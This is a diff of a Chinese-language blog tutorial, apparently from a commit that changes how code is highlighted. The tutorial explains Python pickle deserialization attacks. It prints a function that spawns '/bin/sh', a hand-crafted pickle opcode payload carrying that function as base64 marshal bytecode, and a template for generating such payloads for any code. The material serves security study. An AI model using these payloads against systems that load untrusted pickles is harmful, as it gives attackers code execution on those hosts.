+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'fib(10) ='</span>, fib(<span class="number">10</span>)</span><br><span class="line">    os.system(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"><span class="built_in">print</span> code_serialized</span><br></pre></td></tr></tbody></table></figure>
 
-<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">import</span> os
-    <span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> n <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
-            <span class="token keyword">return</span> n
-        <span class="token keyword">return</span> fib<span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">+</span> fib<span class="token punctuation">(</span>n<span class="token number">-2</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span> <span class="token string">'fib(10) ='</span><span class="token punctuation">,</span> fib<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
-    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
-
-code_serialized <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>marshal<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>foo<span class="token punctuation">.</span>func_code<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span> code_serialized
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>结果：</strong></p>
 <p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161647151.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://picture-1253331270.cos.ap-beijing.myqcloud.com/python反序列化</a> 代码执行2.png)好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 <strong>reduce</strong> 呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，那这个时候怎么办？这时候就要利用我们上面分析的那个 PVM 操作码来自己构造了</p>
 <p>我们先写出来我们需要执行的东西，实际上这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数，这一部分的内容可以看<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/types.html">官方文档</a>的介绍</p>
@@ -259,38 +150,12 @@ code_serialized <span class="token operator">=</span> base64<span class="token p
 <p>(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ‘’))() </p>
 <p>那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行(其实还是蛮复杂的)</p>
 <p><strong>这里直接给出 payload</strong></p>
-<pre class="line-numbers language-python"><code class="language-python">ctypes
-FunctionType
-<span class="token punctuation">(</span>cmarshal
-loads
-<span class="token punctuation">(</span>cbase64
-b64decode
-<span class="token punctuation">(</span>S<span class="token string">'YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMHAAAAcGljNC5weVIBAAAABwAAAHMGAAAAAAEMAQQBcwkAAABmaWIoMTApID1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMHAAAAcGljNC5weXQDAAAAZm9vBQAAAHMIAAAAAAEMAQ8EDwE='</span>
-tRtRc__builtin__
-globals
-<span class="token punctuation">(</span>tRS<span class="token string">''</span>
-tR<span class="token punctuation">(</span>tR<span class="token punctuation">.</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(cbase64</span><br><span class="line">b64decode</span><br><span class="line">(S<span class="string">'YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMHAAAAcGljNC5weVIBAAAABwAAAHMGAAAAAAEMAQQBcwkAAABmaWIoMTApID1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMHAAAAcGljNC5weXQDAAAAZm9vBQAAAHMIAAAAAAEMAQ8EDwE='</span></span><br><span class="line">tRtRc__builtin__</span><br><span class="line"><span class="built_in">globals</span></span><br><span class="line">(tRS<span class="string">''</span></span><br><span class="line">tR(tR.</span><br></pre></td></tr></tbody></table></figure>
+
 <p>大家有兴趣可以自己根据我之前的分析来看自己也分析一下这段代码，会对你的能力有所提升，那么为了每次构造这段代码的方便性，外国大牛给出了构造 payload 的模板，</p>
 <p><strong>payload 模板</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> marshal
-<span class="token keyword">import</span> base64
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># Your code here</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"""ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S'%s'</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS''</span></span><br><span class="line"><span class="string">tR(tR."""</span> % base64.b64encode(marshal.dumps(foo.func_code))</span><br></pre></td></tr></tbody></table></figure>
 
-<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">pass</span> <span class="token comment" spellcheck="true"># Your code here</span>
-
-<span class="token keyword">print</span> <span class="token triple-quoted-string string">"""ctypes
-FunctionType
-(cmarshal
-loads
-(cbase64
-b64decode
-(S'%s'
-tRtRc__builtin__
-globals
-(tRS''
-tR(tR."""</span> <span class="token operator">%</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>marshal<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>foo<span class="token punctuation">.</span>func_code<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>结果：</strong></p>
 <p>我们看一下最终执行这段字符串的结果</p>
 <p><strong>如图所示：</strong></p>
